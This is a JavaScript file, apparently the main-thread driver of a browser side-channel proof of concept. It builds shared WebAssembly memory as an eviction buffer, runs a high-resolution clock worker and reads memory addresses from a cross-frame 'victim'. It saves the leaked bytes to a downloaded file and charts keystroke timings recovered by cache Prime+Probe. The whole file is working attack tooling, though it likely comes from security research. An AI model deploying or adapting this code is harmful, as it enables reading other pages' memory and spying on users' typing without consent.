function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const Natives = (function(){
    function isEnabled() {
        try {
            eval("(function(){%GetOptimizationStatus();})");
            return true;
        }
        catch (e){
            return false;
        }
    }

    const enabled = isEnabled();

    function exportNative(name, argumentCount) {
        const args = new Array(argumentCount).fill(0).map((value, index) => `_${index}`).join(", ");
        if (enabled) {
            return eval(`(function(${args}){return %${name}(${args})})`);
        } else {
            return function(){}
        }
    }

    return {
        enabled: enabled,
        isEnabled: isEnabled,

        debugPrint: exportNative("DebugPrint", 1),
    };
})();

function log(msg) {
    Natives.debugPrint(msg);
    console.log(msg);

    const element = document.getElementById("log");

    const scrolledToBottom = element.scrollHeight - element.clientHeight <= element.scrollTop + 10;
    element.append(msg + "\n");
    if (scrolledToBottom) {
        element.scrollTop = element.scrollHeight - element.clientHeight;
    }
}

async function loadModule(path) {
    const response = await fetch(path);
    const buffer = await response.arrayBuffer();
    const module = new WebAssembly.Module(buffer);

    return module;
}

var keystrokes = []
async function startWorker() {
    const BM = 128*1024*1024; // Eviction buffer
    const WP = 64*1024; // A WebAssembly page has a constant size of 64KB
    const SZ = BM/WP; // 128 hardcoded value in wasm

    const memory = new WebAssembly.Memory({initial: SZ, maximum: SZ, shared: true});

    const buffer = new Uint32Array(memory);
    for (let i = 1; i < buffer.length; i++) {
        buffer[i] = buffer[i] + (i * 511);
    }

    const clockModule = await loadModule('js/evsets/clock.wasm');
    const accessModule = await loadModule('js/evsets/poc.wasm');
    await sleep(1000);

    log("[*] Starting worker!");

    let leakedBytes = [];
    const workerThread = new Worker('js/main-worker.js');
    let clockThread = undefined;

    function respond(message, result) {
        workerThread.postMessage({id: message.id, result: result});
    }

    workerThread.onmessage = async function handle(event) {
        let message = event.data;

        switch (message.type) {
            case 'log':
                log(message.message);
                break;

            case 'error':
                // Recoverable errors
                log(`[!] ERROR: ${message.message}`);
                if (clockThread !== undefined) {
                    log(`Stopping timer...`);
                    clockThread.terminate();
                }
                workerThread.terminate();
                startWorker();
                break;

            case 'exception':
                // Unrecoverable errors
                log(`[!] ERROR: ${message.message}`);
                break;

            case 'end': {
                let typedLeakedBytes = new Uint8Array(leakedBytes);
                log(typedLeakedBytes);
                let file = new Blob([typedLeakedBytes], {type: "octet/stream"});
                let a = document.createElement("a");
                let url = URL.createObjectURL(file);

                a.href = url;
                a.download = "leakedBytes.bin";
                document.body.appendChild(a);
                a.click();

                break;
            }

            case 'getAddress': {
                const begin = Number(window.prompt("Enter address to leak from:"));
                const size = Number(window.prompt("Enter number of bytes to leak:"));
                respond(message, {leakBegin: begin, leakSize: size});
                break;
            }

            case 'leakage': {
                log(message.payload);
                leakedBytes = leakedBytes.concat(message.payload);
                respond(message, null);
                break;
            }

            case 'getAccessModule': {
                respond(message, {module: accessModule, memory: memory});
                break;
            }

            case 'stopTimer': {
                log(`Stopping timer...`);
                if (clockThread !== undefined) {clockThread.terminate();}
                clockThread = undefined;
                await sleep(100);
                respond(message, null);
                break;
            }

            case 'startTimer':
                log(`Starting timer...`);
                if (clockThread === undefined) {
                    clockThread = new Worker('js/evsets/wasmWorker.js');
                    clockThread.postMessage({"module": clockModule, "memory": memory});

                    const buffer = new Uint32Array(memory.buffer);
                    const startTick = Atomics.load(buffer, 64);
                    let   endTick = startTick;
                    let   iterations = 0;

                    const timer = setInterval(function(){
                        endTick = Atomics.load(buffer, 64);
                        iterations++;
                        if (startTick !== endTick) {
                            clearInterval(timer);
                            respond(message, null);
                        }
                        if (iterations >= 100) {
                            log('[!] Clock failed to start...');
                            clearInterval(timer);
                        }
                    }, 10);
                }
                break;

            case 'getCrossFrameAddress': {
                const frame = document.getElementById("frame");
                frame.src = "frame.html";
                window.onmessage = function(event) {
                    switch (event.data.type) {
                        case 'log': {
                            log(`[*] Victim: ${event.data.message}`);
                            break;
                        }

                        case 'array_ptr': {
                            respond(message, event.data.address);
                            break;
                        }
                    }
                };
                break;
            }

            case 'graphKeystrokes':{
                log(keystrokes)
                let key_intervals = []
                for(let i = 0; i < keystrokes.length-1; i++){
                    key_intervals.push(keystrokes[i+1]-keystrokes[i]);
                }
                log(key_intervals)
                
                data = Array.from(message.payload)
                const labels = Array.from(data.keys());

                keystroke_graph = []
                for(let i = 0; i < labels.length; i++){
                    keystroke_graph.push(0); 
                }

                let current = 0;
                for(let i = 0; i < key_intervals.length; i++){
                    keystroke_graph[current + key_intervals[i]] = 500;
                    current += key_intervals[i]
                }
                
                console.assert(keystroke_graph.length == data.length)
                new Chart("keystrokes_graph", {
                    type: 'bar',
                    data: {
                        labels: labels, // X-axis (milliseconds)
                        datasets: [
                            {
                                label: 'Event Counts per Millisecond',
                                data: data, // Y-axis ()
                                backgroundColor: 'red', // Bar color
                                borderWidth: 1
                            }, 
                            {
                                label: 'Actual Keystroke', 
                                data: keystroke_graph,
                                backgroundColor: 'blue',
                                borderWidth: 1
                            }
                        ]
                    },
                    options: {
                        responsive: true,
                        scales: {
                            x: { 
                                title: { display: true, text: "Time (ms)" },
                                ticks: { 
                                    autoSkip: true, 
                                    maxTicksLimit: 5 
                                },
                                grid: {
                                    display: false
                                }
                            },
                            y: { 
                                title: { display: true, text: "Cache Hit Count" },
                                beginAtZero: true,
                                border:{
                                    display: false
                                }
                            }
                        }, 
                        title:{
                            display: true, 
                            text: "Keystroke Recovery with Browser Prime+Probe"
                        }
                    }
                });
                let filtered_data = []
                let prev_hit = -100;
                let detected_strokes = []
                let intervals = []
                for(let i = 0; i < data.length; i++){
                    if(data[i] > 150){
                        if(i-prev_hit > 75){
                            detected_strokes.push(i);
                            filtered_data.push({"time": i, "count": data[i]})
                            if(prev_hit > 0){
                                intervals.push(i-prev_hit)
                            }
                        } 
                        prev_hit = i;
                    }
                }
                log(filtered_data)
                log(intervals)
                document.getElementById("detection").innerHTML = keystrokes + "\n" + key_intervals + "\nNumKeystrokes: " + keystrokes.length + "\n" + detected_strokes + "\n" + intervals + "\nNumDetections: " + filtered_data.length
                respond(message, null);
                break;
            }

            default: {
                log("[!] Unhandled message (Main): " + JSON.stringify(message));
                // window.close();
            }
        }
    };
}
function mean(data){
    let sum = 0;
    for(let value of data){
        sum += value;
    }
    return sum / data.length;
}

document.onkeypress = function(event){
    let time = Math.floor(performance.now())
    log(time)
    keystrokes.push(time)
}
startWorker();
